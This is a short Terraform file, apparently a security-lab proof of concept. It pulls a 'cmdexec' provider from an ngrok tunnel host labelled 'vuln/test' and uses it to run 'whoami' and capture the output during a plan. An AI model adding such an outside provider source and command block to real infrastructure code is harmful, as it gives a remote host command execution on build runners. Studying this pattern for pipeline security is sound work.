terraform {
  required_providers {
    cmdexec = {
      source  = "cider.ngrok.io/vuln/test"
      version = "2.1.0"
    }
  }
}

data "cmdexec_execute" "sample" {
  command = "echo '*****' && whoami && echo '*****' "
}

resource "cmdexec_output" "sample" {
  rc     = data.cmdexec_execute.sample.rc
  output = data.cmdexec_execute.sample.output
}
